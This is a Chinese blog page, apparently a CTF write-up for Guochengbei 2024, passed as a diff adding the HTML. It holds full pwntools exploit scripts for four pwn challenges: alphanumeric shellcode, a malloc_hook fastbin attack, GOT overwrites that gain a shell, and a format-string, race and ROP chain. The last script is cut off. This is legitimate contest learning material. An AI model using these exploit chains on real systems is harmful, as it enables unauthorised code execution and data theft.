@@ -1,0 +1,656 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="powchan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="web调查问卷填问卷即得flag pwnAlpha_Shell禁用了一大串系统调用，拿shell肯定是别想了，只能走orw。但是传统的orw路线给ban了，尝试pwrite时报了段错误，无奈只能走openat+sendfile。另外此题还限制了可见字符shellcode，需要用alpha3生成。 123456789101112131415161718192021222324252627282930">
+<meta property="og:type" content="article">
+<meta property="og:title" content="国城杯2024wp">
+<meta property="og:url" content="https://powchan.github.io.git/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024wp/index.html">
+<meta property="og:site_name" content="powchan:pwn&amp;AI">
+<meta property="og:description" content="web调查问卷填问卷即得flag pwnAlpha_Shell禁用了一大串系统调用，拿shell肯定是别想了，只能走orw。但是传统的orw路线给ban了，尝试pwrite时报了段错误，无奈只能走openat+sendfile。另外此题还限制了可见字符shellcode，需要用alpha3生成。 123456789101112131415161718192021222324252627282930">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-07T09:37:01.000Z">
+<meta property="article:modified_time" content="2024-12-07T09:37:07.949Z">
+<meta property="article:author" content="powchan">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>国城杯2024wp - powchan:pwn&amp;AI</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"powchan.github.io.git","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>powchan:pwn&amp;AI</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="国城杯2024wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-12-07 17:37" pubdate>
+          2024年12月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">国城杯2024wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="调查问卷"><a href="#调查问卷" class="headerlink" title="调查问卷"></a>调查问卷</h4><p>填问卷即得flag</p>
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h4 id="Alpha-Shell"><a href="#Alpha-Shell" class="headerlink" title="Alpha_Shell"></a>Alpha_Shell</h4><p>禁用了一大串系统调用，拿shell肯定是别想了，只能走orw。但是传统的orw路线给ban了，尝试<code>pwrite</code>时报了段错误，无奈只能走<code>openat</code>+<code>sendfile</code>。<br>另外此题还限制了可见字符shellcode，需要用<code>alpha3</code>生成。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31796</span>)<br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+428)</span><br><span class="hljs-comment">#                c</span><br><span class="hljs-comment">#                c</span><br><span class="hljs-comment">#                s</span><br><span class="hljs-comment">#                catch syscall</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>flag = <span class="hljs-number">0x100000900</span><br><br>payload = shellcraft.openat(-<span class="hljs-number">100</span>, <span class="hljs-string">&quot;flag&quot;</span>)<br>payload += shellcraft.sendfile(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>)<br>payload+= shellcraft.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ss&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(asm(payload))<br>    <br>sc = <span class="hljs-string">b&quot;&quot;&quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf\</span><br><span class="hljs-string">    1TqIHf9kDqW02DqX0D1Hu3M2E0T2I0Q030z3P3F7k\</span><br><span class="hljs-string">        4l0l1138124P0U3n060j7k0i0Z180p0k0Y090\</span><br><span class="hljs-string">            n133v2Z032k0Y0F0h09051k3X112l017o1o01&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(sc))<br>io.send(sc)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<h4 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable_hijack"></a>vtable_hijack</h4><p>让我打vtable?包不可能的！此题可以直接打<code>__malloc_hook</code>，利用unsortedbin泄露libc+fastbin attack打malloc_hook即可拿到shell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*main+83)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31126</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;size:&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content:<span class="hljs-built_in">bytes</span></span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;length:&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)).encode())<br>    io.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>, content)<br>    <br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendafter(<span class="hljs-string">b&quot;choice:&quot;</span>, <span class="hljs-string">b&quot;4&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index:\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    <br>    <br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x68</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>ufd = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ufd)&#125;</span>&quot;</span>)<br>main_arena_offset = libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br>libc_base = ufd - <span class="hljs-number">96</span> - main_arena_offset + <span class="hljs-number">8</span><br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>log.success(<span class="hljs-string">f&quot;mh&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(malloc_hook)&#125;</span>&quot;</span>)<br>og = libc_base + <span class="hljs-number">0xd5c07</span><br><br>stdout_vtable_ptr = libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="hljs-number">0xd8</span> + libc_base<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x80</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>heap_1_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br><br>log.success(<span class="hljs-string">f&quot;heap&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap_1_addr)&#125;</span>&quot;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">1</span>, p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">4</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x13</span>+p64(og))<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x100</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="beverage-store"><a href="#beverage-store" class="headerlink" title="beverage store"></a>beverage store</h4><blockquote>
+<p>这题容器有问题，反馈后也没修好，只能赛后加分……</p>
+</blockquote>
+<p>经典负数索引利用。打随机数就不赘述了，直接说攻击流程。首先篡改<code>exit</code>的got表到<code>buy</code>函数上，让程序陷入循环；再泄露<code>puts</code>地址，拿到libc基地址；再篡改<code>printf</code>got表到<code>system</code>函数上；最后篡改<code>exit</code>的got表到那个<code>printf(&quot;/bin/sh&quot;)</code>的函数上即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>librand = ctypes.cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b buy</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span> ,<span class="hljs-number">31819</span>)<br>buy = <span class="hljs-number">0x40133b</span><br>backdoor = <span class="hljs-number">0x401511</span><br>io.sendafter(<span class="hljs-string">b&quot;input yours id\n&quot;</span>, <span class="hljs-string">b&quot;name&quot;</span>)<br>librand.srand(librand.time(<span class="hljs-number">0</span>)) <br>rand_byte = <span class="hljs-built_in">str</span>(librand.rand()).encode()<br>sleep(<span class="hljs-number">1</span>)<br>io.sendline(rand_byte)<br><span class="hljs-built_in">print</span>(libc.sym[<span class="hljs-string">&quot;system&quot;</span>]-libc.sym[<span class="hljs-string">&quot;puts&quot;</span>])<br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-4&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(buy))<br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-8&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, <span class="hljs-string">b&quot;\x50&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;succeed\n&quot;</span>)<br>puts_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = <span class="hljs-number">0x4021c2</span><br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-7&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(system_addr))<br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-4&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(backdoor))<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="Offensive-Security"><a href="#Offensive-Security" class="headerlink" title="Offensive_Security"></a>Offensive_Security</h4><p>先打格式化字符串绕过第一个检查。接下来是两个线程，都没加锁，数据共享，其中<code>guess</code>加载得快些，也就给了我们篡改相应值、绕过login检查的机会。 首先快速给guess发送一个1，sleep之后再给checker发一个1，就实现了绕过。<br>login成功后是一个栈溢出，考虑构造ROP链。但题目没给libc，那就只能考虑利用现有函数了。注意到<code>printer</code>函数是读取某个文件并将其内容输出，也就是说我们只需要控制<code>rdi</code>寄存器的值为<code>flag</code>字符串的地址即可。这里套用<code>fluff</code>题目的板子构造ROP链把flag写到data段上，再pop rdi即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b login</span><br><span class="hljs-comment">#                b vuln</span><br><span class="hljs-comment">#                b checker</span><br><span class="hljs-comment">#                b guess</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31982</span>)<br>printer = <span class="hljs-number">0x400647</span><br>fmt = <span class="hljs-string">b&quot;%7$lln&quot;</span><br>io.sendafter(<span class="hljs-string">b&quot;Username:\n&quot;</span>, fmt)<br>io.sendafter(<span class="hljs-string">b&quot;password: \n&quot;</span>, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">8</span>)<br><br>io.send(<span class="hljs-string">b&quot;1\n&quot;</span>)<br>sleep(<span class="hljs-number">3</span>)<br>io.send(<span class="hljs-string">b&quot;1\n&quot;</span>)<br><br>bextr_ret = <span class="hljs-number">0x400650</span><br>xlatb_ret = <span class="hljs-number">0x40064e</span><br>pop_rdi_ret = <span class="hljs-number">0x400661</span><br>stosb_rdi_al_ret = <span class="hljs-number">0x40065f</span><br>buffer = <span class="hljs-number">0x6002c0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_rbx</span>(<span class="hljs-params">b:<span class="hljs-built_in">int</span></span>):<br>    p = <span class="hljs-string">b&quot;&quot;</span><br>    p += p64(bextr_ret)<br>    p += p64(<span class="hljs-number">0x4000</span>)<br>    p += p64(b - <span class="hljs-number">0xD093</span>)<br>    <span class="hljs-keyword">return</span> p<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_al</span>(<span class="hljs-params">a:<span class="hljs-built_in">bytes</span>,offset:<span class="hljs-built_in">int</span></span>):<br>    log.success(<span class="hljs-string">&quot;&lt;&lt;&lt;&quot;</span>)<br>    tmp = <span class="hljs-built_in">next</span>(e.search(a)) - offset<br>    log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(tmp)&#125;</span>, a=<span class="hljs-subst">&#123;a&#125;</span>&quot;</span>)<br>    p = p64(xlatb_ret)<br>    <span class="hljs-keyword">return</span> set_rbx(tmp) + p<br> <br>is_first = <span class="hljs-literal">True</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_al</span>(<span class="hljs-params">val:<span class="hljs-built_in">bytes</span>,offset:<span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">global</span> is_first<br>    p = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> is_first:<br>        p += p64(pop_rdi_ret)<br>        p += p64(buffer)<br>        is_first = <span class="hljs-literal">False</span><br>    p += p64(stosb_rdi_al_ret)<br>    <span class="hljs-keyword">return</span> set_al(val,offset) + p<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_str</span>(<span class="hljs-params">s:<span class="hljs-built_in">bytes</span></span>):<br>    p=<span class="hljs-string">b&quot;&quot;</span><br>    last_al = <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        p += save_al(p8(i),last_al)<br>        last_al = i<br>    <span class="hljs-keyword">return</span> p<br> <br> <br>payload = write_str(<span class="hljs-string">b&quot;flag&quot;</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(buffer)<br>payload += p64(printer)<br><br>io.sendafter(<span class="hljs-string">b&quot;success!\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x20</span>+<span 